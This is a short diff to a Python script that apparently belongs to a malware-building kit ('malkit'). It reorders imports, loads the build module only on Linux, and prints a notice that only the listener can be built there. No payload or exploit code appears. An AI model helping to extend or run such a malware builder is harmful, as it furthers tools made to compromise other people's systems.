@@ -1,3 +1,4 @@
+from progress.spinner import Spinner
 import argparse
 import configparser
 import os
@@ -6,8 +7,15 @@ import time
 from builtins import KeyboardInterrupt
 from subprocess import call
 
-from darkarp.malkit_modules import build
-from progress.spinner import Spinner
+if sys.platform == "linux":
+    from darkarp.malkit_modules import build
+    print("""
+    [!] ATTENTION
+
+You are running this on Linux and as such, building capabilities are limited.
+You can only build the listener
+
+""")
 
 # from testing import build
 
